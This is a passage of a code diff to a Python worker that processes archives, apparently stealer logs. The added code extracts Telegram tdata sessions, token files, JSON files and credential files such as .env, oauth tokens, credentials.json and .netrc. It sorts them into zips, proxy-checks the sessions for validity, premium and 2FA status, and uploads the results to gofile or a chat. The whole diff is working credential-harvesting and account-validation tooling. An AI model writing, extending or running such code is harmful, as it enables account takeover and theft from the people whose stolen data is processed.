+            try:
+                z.write(str(p), name)
+            except Exception:
+                continue
+            used.add(name.lower())
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s  <-  %s" % (name, rel))
+            total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "JSON FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
+# secret-ish files collected automatically (like tokens.txt)
+SECRET_NAMES = {
+    "credentials.json": "credentials_json",
+    "oauth_creds.json": "oauth_creds_json",
+    "oauth.json": "oauth_json",
+    "token.json": "token_json",
+    "tokens.json": "tokens_json",
+    "secrets.json": "secrets_json",
+    "apps.json": "apps_json",
+    "config.yaml": "config_yaml",
+    "config.yml": "config_yaml",
+    "hosts.yml": "hosts_yml",
+    "antigravity-oauth-token": "antigravity_oauth_token",
+    "opencode.db": "opencode_db",
+    ".secret": "secret",
+    ".env": "env",
+    ".env.local": "env_local",
+    ".env.production": "env_production",
+    ".netrc": "netrc",
+}
+SECRET_FILTERS = ["secrets.json", "credentials.json", "oauth*.json",
+                  "token*.json", "tokens.json", "apps.json", "config.yaml",
+                  "config.yml", "hosts.yml", "antigravity-oauth-token",
+                  "opencode.db", "*.db", ".env*", "*.env", ".netrc",
+                  "*.netrc", ".secret", "*.secret"]
+
+def find_secrets(roots):
+    """Every secret file (by exact name) anywhere in the trees."""
+    out = []
+    for root in roots:
+        try:
+            if not root or not Path(root).exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower() in SECRET_NAMES:
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_secrets(files):
+    """secrets.zip: one folder per file TYPE (env/, credentials_json/…);
+    original names kept, duplicates become name_#1 / name_#2 inside the
+    folder; found_in.txt maps every file to its origin path."""
+    if not files:
+        return None, 0
+    zp = OUT / "secrets.zip"
+    counts = dict.fromkeys(SECRET_NAMES.values(), 0)
+    manifest, total = [], 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        files.sort(key=lambda p: (p.name.lower(), str(p)))
+        for p in files:
+            fold = SECRET_NAMES.get(p.name.lower())
+            if not fold:
+                continue
+            counts[fold] += 1
+            n = counts[fold]
+            if n <= 1:
+                inner = p.name
+            elif p.name.startswith("."):
+                inner = "%s_#%d" % (p.name, n)
+            else:
+                stem, ext = os.path.splitext(p.name)
+                inner = "%s_#%d%s" % (stem, n, ext)
+            try:
+                z.write(str(p), "%s/%s" % (fold, inner))
+            except Exception:
+                continue
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s/%s  <-  %s" % (fold, inner, rel))
+            total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "SECRET FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
     return zp, total
 
 def finish(task, stage, **extra):
@@ -1094,11 +1785,17 @@ def finish(task, stage, **extra):
     payload.update({k: extra[k] for k in extra
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
-                             "td_sent", "ck_total", "ck_live", "ck_prem", "ck_free",
+                             "td_parts", "td_via", "tok_total", "tok_parts",
+                             "js_total", "js_parts", "sec_total", "sec_parts",
+                             "tk_total", "tk_valid",
+                             "tk_prem", "tk_2fa", "tk_frozen", "tk_dead",
+                             "tk_err", "tk_zip", "tk_proxies", "tk_link",
+                             "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
     report(payload)
     PB[1] = None
+
 
 def process(task):
     """Run one job inside this long-lived VM."""
@@ -1130,7 +1827,8 @@ def process(task):
         else:
             finish(task, "error", err=why)
         return
-    shutil.rmtree(WORK / "dl", ignore_errors=True)
+    # keep dl/ for the whole run: the json / secrets / tdata passes all need
+    # the archive on disk, WORK is wiped at the end anyway.
     packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
@@ -1141,22 +1839,169 @@ def process(task):
     auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
     td_zip, td_total = None, 0
     if want_tdata:
-        td_zip, td_total = pack_tdata(find_tdata(WORK / "ex"))
-    td_sent = False
+        tdirs = find_tdata(WORK / "ex")
+        if not tdirs:
+            # the filtered extract skips tdata binaries — pull them now
+            st("extract", 45, msg="tdata not in filtered extract — pulling")
+            try:
+                _extract(arc, WORK / "tdex", task.get("passwords") or [],
+                         ["*tdata*"])
+            except Exception as e:
+                sys.stdout.write("tdex pass: %s\n" % e); sys.stdout.flush()
+            tdirs = find_tdata(WORK / "ex") + find_tdata(WORK / "tdex")
+        if not tdirs:
+            st("extract", 45, msg="full extract to hunt tdata folders")
+            try:
+                _extract(arc, WORK / "tdfull", task.get("passwords") or [], None)
+            except Exception as e:
+                sys.stdout.write("tdfull pass: %s\n" % e); sys.stdout.flush()
+            tdirs = find_tdata(WORK / "tdfull")
+        if not tdirs:
+            tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
+        td_zip, td_total = pack_tdata(tdirs)
+    td_parts, td_link, td_via = 0, None, None
     if td_zip:
-        cap = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
-               % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
-               f"🗃 {bold('Folders')}  {code(td_total)}\n"
-               f"🗂 {bold('Layout')}  one tdata.zip · td_1st_tdata/, td_2nd_tdata/…\n"
-               f"📎 Upload in a moment — sessions, map0 and key files included.")
-        td_sent = upload(str(td_zip), cap)
+        td_size = td_zip.stat().st_size
+        td_head = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
+                    % (td_total, '' if td_total == 1 else 's')))}\n{THIN}\n"
+                   f"🗃 {bold('Folders')}  {code(td_total)}\n"
+                   f"📦 {bold('Size')}     {code(fs(td_size))}\n")
+        td_tail = (f"🗂 {bold('Layout')}    plain folder trees inside the zip — "
+                   f"no zip-in-zip, unzip and use\n"
+                   f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
+                   f"📎 Sessions, map0/map1 and key files all included.")
+        td_link = gofile(str(td_zip))
+        if td_link:
+            td_parts, td_via = 1, "link"
+            new_card(td_head + f"🔓 {bold('Download')} {code(td_link)}\n"
+                              f"🌐 {bold('Note')}      one zip, whole tdata set — "
+                              f"link works for anyone, not just you\n" + td_tail)
+        else:
+            # gofile is down — the archive is still worth delivering, so fall back
+            # to the chat copy instead of losing the run's tdata work.
+            sys.stdout.write("gofile failed for tdata.zip — sending it to chat\n")
+            sys.stdout.flush()
+            def td_cap(size, idx, count, tot, split):
+                return td_head + ship_note(idx, count, size, tot, split, "tdata.zip") + td_tail
+            td_parts, td_link = ship(td_zip, td_cap)
+            td_via = "chat"
+        if td_link:
+            links["tdata"] = td_link
+    tk = {}
+    if want_tdata and task.get("tdatacheck") and tdirs:
+        st("queued", 89, job=task.get("job"), vm=SPECS,
+           msg="tdata proxy-check starting")
+        try:
+            tk = check_tdata(tdirs)
+        except Exception as e:
+            sys.stdout.write("tdcheck crashed: %s\n" % e); sys.stdout.flush()
+            tk = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0,
+                  "tk_2fa": 0, "tk_frozen": 0, "tk_dead": 0, "tk_err": len(tdirs),
+                  "tk_proxies": 0, "tk_zip": False}
+    tok_zip, tok_total = None, 0
+    toks = find_tokens([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+    if toks:
+        tok_zip, tok_total = pack_tokens(toks)
+    tok_parts, tok_link = 0, None
+    if tok_zip:
+        def tok_cap(size, idx, count, tot, split):
+            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
+                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
+                    f"🏷 {bold('Names')}    {code('<folder it came from>_file_token.txt')}\n"
+                    + ship_note(idx, count, size, tot, split, "tokens.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        tok_parts, tok_link = ship(tok_zip, tok_cap)
+        if tok_link:
+            links["tokens"] = tok_link
+    js_zip, js_total = None, 0
+    if task.get("json"):
+        st("scan", 44, msg="hunting every .json in the archive")
+        jsf = find_json([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+        sys.stdout.write("json hunt 1st pass: %d files\n" % len(jsf))
+        sys.stdout.flush()
+        if not jsf:
+            # the filtered extract only keeps .txt/.log/.cookie/auth.json —
+            # pull all the other .json files now; on nested archives the
+            # include-mask pass often matches nothing, so a full pass follows
+            st("extract", 45, msg="pulling every .json from the archive")
+            ok, why = False, "pass_skipped"
+            try:
+                ok, why = _extract(arc, WORK / "jx",
+                                   task.get("passwords") or [], ["*.json"])
+                sys.stdout.write("jx incl pass: ok=%s why=%s\n" % (ok, why))
+            except Exception as e:
+                sys.stdout.write("jx incl pass: %s\n" % e)
+            sys.stdout.flush()
+            jsf = find_json([WORK / "jx"])
+            if not jsf:
+                st("extract", 45, msg="full extract to gather every .json")
+                try:
+                    ok, why = _extract(arc, WORK / "jx",
+                                       task.get("passwords") or [], None)
+                    sys.stdout.write("jx full pass: ok=%s why=%s\n" % (ok, why))
+                except Exception as e:
+                    sys.stdout.write("jx full pass: %s\n" % e)
+                sys.stdout.flush()
+                jsf = find_json([WORK / "jx"])
+            sys.stdout.write("json hunt total: %d files\n" % len(jsf))
+            sys.stdout.flush()
+        js_zip, js_total = pack_json(jsf)
+    js_parts, js_link = 0, None
+    if js_zip:
+        def js_cap(size, idx, count, tot, split):
+            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
+                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
+                    f"🏷 {bold('Names')}    original names — duplicates become "
+                    f"{code('name_#1.json')}, {code('name_#2.json')}\n"
+                    + ship_note(idx, count, size, tot, split, "json_files.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        js_parts, js_link = ship(js_zip, js_cap)
+        if js_link:
+            links["json"] = js_link
+    # ── secret files — automatic, like tokens.txt ──
+    secf = find_secrets([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+    if not secf:
+        st("extract", 45, msg="pulling secret files from the archive")
+        try:
+            _extract(arc, WORK / "sx", task.get("passwords") or [],
+                     SECRET_FILTERS)
+        except Exception as e:
+            sys.stdout.write("sx pass: %s\n" % e)
+        sys.stdout.flush()
+        secf = find_secrets([WORK / "sx"])
+        if not secf:
+            st("extract", 45, msg="full extract to hunt every secret file")
+            try:
+                _extract(arc, WORK / "sx", task.get("passwords") or [], None)
+            except Exception as e:
+                sys.stdout.write("sx full pass: %s\n" % e)
+            sys.stdout.flush()
+            secf = find_secrets([WORK / "sx"])
+    sys.stdout.write("secret hunt: %d files\n" % len(secf)); sys.stdout.flush()
+    sec_zip, sec_total = pack_secrets(secf)
+    sec_parts, sec_link = 0, None
+    if sec_zip:
+        def sec_cap(size, idx, count, tot, split):
+            return (f"{gold_header('SECRET FILES', esc('%d found' % sec_total))}"
+                    f"\n{THIN}\n"
+                    f"🗝 {bold('Files')}    {code(sec_total)} secret files\n"
+                    f"🏷 {bold('Layout')}   one folder per type — {code('env/')}, "
+                    f"{code('credentials_json/')}, {code('secrets_json/')}…\n"
+                    + ship_note(idx, count, size, tot, split, "secrets.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        sec_parts, sec_link = ship(sec_zip, sec_cap)
+        if sec_link:
+            links["secrets"] = sec_link
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
     finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
-           td_total=td_total, td_sent=td_sent, **ck)
+           td_total=td_total, td_parts=td_parts, td_via=td_via,
+           tok_total=tok_total, tok_parts=tok_parts,
+           js_total=js_total, js_parts=js_parts,
+           sec_total=sec_total, sec_parts=sec_parts, **tk, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
@@ -1173,4 +2018,5 @@ def main():
     st("queued", 0, job=task.get("job"), vm=SPECS)
     process(task)
 
-main()
+if __name__ == "__main__":
+    main()
